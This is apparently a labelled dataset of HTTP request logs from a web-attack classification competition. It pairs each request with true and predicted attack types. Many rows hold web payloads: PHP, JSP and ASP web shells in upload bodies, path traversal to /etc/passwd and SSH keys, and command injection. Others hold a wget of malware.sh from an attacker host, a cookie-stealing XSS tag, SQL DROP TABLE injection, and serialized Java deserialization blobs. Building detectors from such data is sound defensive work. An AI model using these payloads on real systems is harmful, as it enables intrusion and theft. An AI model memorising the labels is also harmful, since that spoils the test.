row_id,timestamp,user_agent,method,src_ip,dst_ip,url_path,request_body,attack_type(结果列，需参赛选手判断输出),attack_type_pred
4788,2025-11-12 11:53:04,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.24.135,10.251.99.239,/FILE/upLoad,"------WeBkitFoRMBouNDarY513247
CONtEnt-DIspOsiTion:%20ForM-data;%20name%3d%22aVataR%22;%20Filename%3d%22bacKDoor569.PHp%22
COntENt-TyPE:%20teXt/PLain

%3C?php%20sYSTem($_GET[%27CMd%27]);%20?%3e
------WEBKitFormBoUNdary308966--",文件上传攻击,文件上传攻击
5138,2025-11-03 03:14:51,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.10.146,10.251.99.247,/api/file?resource=../../.env746,,目录遍历攻击,目录遍历攻击
3430,2025-11-08 05:50:11,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.64.105,10.187.53.88,/tHeme,theme=fIlE:///etc/passwD213,文件包含攻击,文件包含攻击
1748,2025-10-28 21:31:04,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.187.74.182,10.252.158.86,/api/ping,target=127.0.0.1475|id,远程命令执行攻击,远程命令执行攻击
10975,2025-11-13 19:37:04,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.7.248,10.168.1.237,/change-password,action=delete&confirm=true,CSRF攻击,CSRF攻击
10687,2025-10-27 09:55:29,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.187.19.212,10.253.177.27,/static?dir=../../../../boot.ini441,,目录遍历攻击,目录遍历攻击
9871,2025-11-12 18:19:49,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,10.10.130.17,10.235.158.86,/dashboard&test=7,,正常访问,正常访问
9962,2025-11-08 16:22:48,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.10.146,10.251.227.109,/DowNlOaD,DOcUmEnt%3d../../../+../wIndowS/SyStEM32/+drivers/EtC/hosts870,目录遍历攻击,目录遍历攻击
3152,2025-10-29 20:11:52,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.5.6,10.251.227.7,/ProfiLe,,正常访问,正常访问
1652,2025-10-22 06:46:06,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.26.157,10.251.99.250,/regiSTeR&timestamp=1763343809&timestamp=1763343809,tiTlE=NeW posT 5719&coNTenT=Post conteNt heRe&cache=false,正常访问,正常访问
985,2025-10-16 10:14:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.25.189.55,10.153.177.26,/page?lang%3Dphp://input&timestamp=1762948282&random=962,,文件包含攻击,文件包含攻击
2608,2025-10-28 14:40:49,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.21.4,10.110.192.6,/api/ping,domain=test110.com&&whoami,远程命令执行攻击,远程命令执行攻击
6550,2025-10-26 13:21:49,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.252.168.242,10.16.210.9,/cOmMENt?cOmMEnt%3D%3Cimg%20src%3Dx%20onError%3DtHiS.srC%3D%27httP://attacker5.COm/stEAl.phP?cookiE%3D%27+dOCumeNT.cookIe%3e&timestamp=1763345730&random=1399&test=848,,XSS跨站脚本攻击,XSS跨站脚本攻击
141,2025-11-12 12:55:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.25.189.54,10.153.250.159,/file,filepath=../../../application.yml,目录遍历攻击,目录遍历攻击
5233,2025-11-15 15:27:42,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.7.21,10.240.84.19,/api/download,filepath=../../../application175.yml,目录遍历攻击,目录遍历攻击
10987,2025-11-05 20:26:49,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.4.177,10.251.248.103,/RegiSTer&test=758&random=4220,,正常访问,正常访问
1046,2025-11-04 23:02:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.25.189.55,10.153.177.26,/login?limit%3D10&debug=1&timestamp=1762948282,,正常访问,正常访问
3485,2025-10-30 19:41:53,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.187.26.68,10.252.189.248,/post&debug=0&test=446,meSSaGe=<bod+Y onLOad=Ale+rt('XSS779')+>&cache=fals+e,XSS跨站脚本攻击,XSS跨站脚本攻击
6150,2025-11-07 10:50:11,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.168,/upload,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==673",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
3652,2025-11-02 01:32:03,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.246.10.239,10.244.155.144,/uPlOaD&timestamp=1763340163&cache=true,"------WeBKitFormBoundARy680910
cONteNT-dIsposition: foRM-data; nAmE=""AvAtaR""; fIleNAme=""BAckdOor29.phP""
CoNTENt-TypE: TExt/PLain

<?PHP sYstEM($_GET['cmD']); ?>
------WeBkitfOrmBounDarY736034--&timestamp=1763343363",文件上传攻击,文件上传攻击
8818,2025-10-28 04:02:03,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.88.44,10.187.20.132,/pRoceSs&cache=false&random=6212&random=6212,"ro0AbxNYABFqyXZhLnv0aWwUsGFzAFnldjyGOU83gm6gAgabRGakBg9HZEzhy3rvckKAcXROcmvzag9szHhwP0aAAAAAaAx3cAaAaBaAAAAHDaAKAMf2Ys51dGlsLnnyabFqYxZHLmxhbmcuUNVUdGlTzQaAAaAAAAaaAaAABXzYABBqYXZHlmxHbMcUU3LZdgVTAAaAAAaAaAAaAABJKWn1CNjlbnRUaW1LTwLsBgLZsMF2YQBAb3JnLmFWYWNoZS5jb21TB25zlMNvbGXLY3rP
b25ZMS5db25zdgFuDE1hCaAAAAAAAAAbwACIAaVtYxB0AA9MAmf2YS91dGlsL01hcdT4cHciaaAAQAAaAAJzcgaRaMf2yS5sYW5nLklUdGVnZXIS4qCk94GhoAiAaUKAbxZHbhVlehiaEGphdmEUbgFuZy5ODW1iZxkgrjUDC5TgIwiAAHHwAAAAaXnyAbRqYxZHlnv0awwUsGfzAE1HcAuH2SHDFmDPawadSqaKbg9hZEzhY3RVCkKAcXrOcmVZAg9sZHHWP0AAAaAAAaB3CAAaaBAAAAahdAajBXlpYMPLY3R0AajBQnNYABdqYXZhLmXHbmcuu3RyaW5n063kkljqyr4CAaFAAAV2yWx1zXhyABbqyxZHLmxhbmcUt2JQZWN0AAAAaAaAAAaaAAb4cHQABhrlc3R0AaR0CNVLea%3D%3d348&cache=true&cache=true",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
4954,2025-10-26 18:33:02,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,192.168.10.59,10.251.10.18,/aPi/fIle?iNcLUde=../../../../Root/.ssh/Id_Rsa577,,目录遍历攻击,目录遍历攻击
10657,2025-11-16 09:00:57,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.108.208.231,10.253.176.212,/comment,"message=<iframe src=""javascript:alert&#x28;844&#x29;"">",XSS跨站脚本攻击,XSS跨站脚本攻击
7425,2025-10-21 08:10:11,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,192.168.5.124,10.251.227.107,/about/524&debug=1&debug=1,,正常访问,正常访问
4723,2025-10-20 13:19:04,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.7.30,10.251.10.19,/api/restore,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==914",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
10102,2025-10-27 20:26:53,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,192.168.15.119,10.226.76.101,/register,name=User2142&email=user266@example.com&message=Hello,正常访问,正常访问
2095,2025-11-09 14:39:23,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.253.83.6,10.253.68.169,/dashboard,comment=This is a great product 8165,正常访问,正常访问
9424,2025-11-15 01:13:35,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.245.224.82,10.244.155.172,/api/execute,address=127.0.0.1455; net user,远程命令执行攻击,远程命令执行攻击
7375,2025-11-16 11:07:18,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.15.103,10.251.227.40,/profile/avatar,"------WebKitFormBoundary371490
Content-Disposition: form-data; name=""avatar""; filename=""backdoor669.jsp""
Content-Type: application/octet-stream

<% Runtime.getRuntime().exec(request.getParameter(""cmd"")); %>
------WebKitFormBoundary818454--",文件上传攻击,文件上传攻击
7387,2025-11-16 23:01:53,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.253.58.49,10.253.87.215,/dashboard,page=76&limit=10&sort=name,正常访问,正常访问
7986,2025-10-19 17:57:03,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.210.67.224,10.244.155.172,/paGe&test=123&debug=1&test=123,lanG%3DPHP://inpUT&test=865,文件包含攻击,文件包含攻击
10626,2025-11-15 07:51:23,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.187.74.10,10.252.158.86,/process,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==803",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
9503,2025-10-29 04:43:31,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.12.239,10.210.184.38,/include?page=zip://malicious769.zip#shell.php,,文件包含攻击,文件包含攻击
2773,2025-11-03 08:45:42,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.7.106,10.251.227.39,/page,page=http://malicious110.com/shell.txt,文件包含攻击,文件包含攻击
8013,2025-10-31 20:25:36,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.210.22.248,10.10.110.141,/home,,正常访问,正常访问
6903,2025-10-29 07:09:56,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.12.191,10.251.227.112,/SearcH&timestamp=1763344125&timestamp=1763344125&timestamp=1763344125,search=')+ Or ('1'=+'1&test=6+64,SQL注入攻击,SQL注入攻击
6799,2025-10-28 17:58:31,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.10.196,10.251.227.35,/search?sort%3Dname&debug=0,,正常访问,正常访问
353,2025-10-15 11:15:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.25.189.54,10.153.176.211,/about?sort=name,,正常访问,正常访问
8439,2025-10-31 17:34:15,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.210.22.248,10.10.110.144,/UPlOAD,"------WebkiTFORmboUNdarY34957
contEnT-DispositIoN: fORm-dATA; nAmE=""upLoad""; filename=""WeBShEll10.asP""
coNtENt-TyPE: application/oCtet-StrEAM

<% evAL reqUest(""CMD"") %>
------wEbKitFoRmBOuNdaRy145689--",文件上传攻击,文件上传攻击
2098,2025-11-13 14:43:32,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.108.208.231,10.253.176.211,/profile,name=<svg/onload=alert&#x28;34&#x29;>,XSS跨站脚本攻击,XSS跨站脚本攻击
8336,2025-11-13 12:58:01,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.210.22.249,10.10.110.144,/Api/pIng,q%3dHeLlo880|C%27a%27t%20/Etc/paSSWd,远程命令执行攻击,远程命令执行攻击
4531,2025-11-07 14:21:51,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,10.246.16.4,10.10.159.189,/api/products,,正常访问,正常访问
10394,2025-11-07 11:10:37,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,DELETE,192.168.20.105,10.53.48.195,/home,,正常访问,正常访问
9966,2025-10-31 09:05:35,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.15.82,10.251.99.248,/pRocEss&random=8903,"rO0AbXNyADRtes5wyWNrYWdLLK15q2xhc3mAAaAaAAAAAQwAAHHWdwEAHQACaAAAAnnyAbfqYXZHLmxhBMcuunvuDgLtzQAAAAAAAAAaAAAABXZYAbbqyXzhlmXhBmcuU3lzdGvtAAAaAaAaAAAAAabjkwn1cnJlbnRuaW1ltWLSBGlzSmF2yqbAb3jNLmFWYWNoZS5JB21tb25zlmnvBgxlY3Rp
B25ZMs5cYXNoZu1hcAAAAaaaaaAbWaCIaAVtYXB0aA9mamf2ys9+1dglsL01hcDt4cHNyaBFQYXZHlnv0aWwuSGFzaE1hcAUH2sHdFMdPAwadSqaKbg9hZeZHY3rvckkACxRocmVzaG9sZHhwP0aaaAAAaab3CAAAABAAAaaHDaaJBXlPYMPLY3R0aAJbQnNyABdQYxZhLmxhBmCuU3rYaw5n063KKLjqYr4caAfaAaV2yWx1ZXhyABBqYXZhlMXhBmcuT2jqzwN0aaaAAAAAAAAAaAb4chQaBHRlC3R0AAR0CnVlEA%3D%3D509&debug=0",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
8985,2025-10-29 17:06:10,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.25.14.28,192.168.3.2,/api/users&debug=0&random=725&debug=0,q%3Dquery2945%26category%3Dbooks&timestamp=1763342321&timestamp=1763342321&test=492,正常访问,正常访问
7231,2025-10-30 12:02:47,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.10.25,10.244.207.16,/deserialize,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==501",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
4238,2025-10-28 05:16:27,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.251.148.144,10.187.26.188,/search?sort%3Dname,,正常访问,正常访问
6187,2025-10-25 12:44:17,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.19.11,10.251.110.241,/UpDATe-PRoFiLE,New_pasSWOrd=hacked560&confIrm_pasSword=HacKeD273,CSRF攻击,CSRF攻击
5301,2025-10-28 06:08:45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.253.68.105,10.10.110.133,/search,"{""name"":""User690"",""email"":""user9039@example.com"",""message"":""Hello""}",正常访问,正常访问
6233,2025-11-07 20:35:17,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.187.19.210,10.253.177.28,/upload&cache=true&cache=true&test=454,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==606&debug=0",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
4665,2025-11-09 12:53:54,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.20.101,10.12.13.11,/ping,target=127.0.0.1100|ipconfig,远程命令执行攻击,远程命令执行攻击
6479,2025-11-15 16:59:38,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,DELETE,192.168.10.147,10.251.98.16,/register/57,,正常访问,正常访问
1369,2025-11-04 01:55:12,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.253.83.6,10.253.68.169,/assets?load=../../../WEB-INF/web.xml901,,目录遍历攻击,目录遍历攻击
1114,2025-11-14 06:15:44,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.10.183,10.251.96.250,/api/users&cache=false&test=705&cache=false,id=514'; DROP TABLE users690; --&random=5819&random=5819,SQL注入攻击,SQL注入攻击
5944,2025-10-29 17:28:06,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.204.201,10.16.210.9,/update-pRofILE,reDirect_url%3DhTt+P://maliciOUs335.c+om%26token%3dbyPAs+s,CSRF攻击,CSRF攻击
9271,2025-11-01 19:25:38,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.253.83.6,10.253.68.169,/template?include%3Dphp://filter/resource%3D/etc/passwd71,,文件包含攻击,文件包含攻击
734,2025-10-18 19:00:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.10.130.17,10.18.76.33,/api/orders,q=golang&category=books,正常访问,正常访问
4982,2025-10-30 14:03:27,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.11.75,10.253.224.246,/transfer,new_password=hacked524&confirm_password=hacked866,CSRF攻击,CSRF攻击
10837,2025-10-22 10:01:12,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.187.69.67,10.252.110.85,/file?file=../../../../etc/passwd678&debug=1&random=5843,,目录遍历攻击,目录遍历攻击
1734,2025-10-28 04:29:39,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.251.216.206,10.210.184.39,/api/restore,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZ+hLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQ+AAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVz+aG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA%3D%3D521",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
10056,2025-11-08 13:29:41,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.252.13.92,10.210.184.41,/products,,正常访问,正常访问
863,2025-10-23 01:58:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.10.130.17,10.18.76.33,/api/message?comment=<ScRiPt>alert('XSS')</ScRiPt>,,XSS跨站脚本攻击,XSS跨站脚本攻击
9304,2025-11-09 07:22:46,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,10.245.210.105,10.244.155.134,/register/316,,正常访问,正常访问
4532,2025-11-15 04:39:39,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.246.16.4,10.252.133.241,/TrAnsFeR,ActioN=deLEte&coNfirm=TRuE,CSRF攻击,CSRF攻击
9650,2025-10-31 04:10:51,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.10.143,10.251.10.246,/transfer,redirect_url=http://malicious756.com&token=bypass,CSRF攻击,CSRF攻击
5214,2025-11-16 15:29:42,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.248.26.53,10.210.184.42,/execute?server%3Dlocalhost838;%20wget%20http://attacker128.com/malware.sh&random=4975&debug=1&random=4975,,远程命令执行攻击,远程命令执行攻击
6909,2025-11-15 13:41:34,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,10.253.250.221,10.10.130.86,/register,,正常访问,正常访问
6964,2025-11-07 12:38:24,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.251.209.54,10.210.184.38,/download,filepath%+3D../../.+./applica+tion405.y+ml,目录遍历攻击,目录遍历攻击
231,2025-10-29 16:25:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.25.73.35,10.168.3.66,/documents/upload,"------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""file""; filename=""shell.php""
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--",文件上传攻击,文件上传攻击
3719,2025-11-06 20:46:04,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.4.177,10.251.212.73,/documents/upload,"------WebKitFormBoundary161277
Content-Disposition: form-data; name=""avatar""; filename=""backdoor953.jsp""
Content-Type: application/octet-stream

<% Runtime.getRuntime().exec(request.getParameter(""cmd"")); %>
------WebKitFormBoundary836331--",文件上传攻击,文件上传攻击
10455,2025-11-15 02:54:17,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,10.245.76.184,10.10.159.189,/home,,正常访问,正常访问
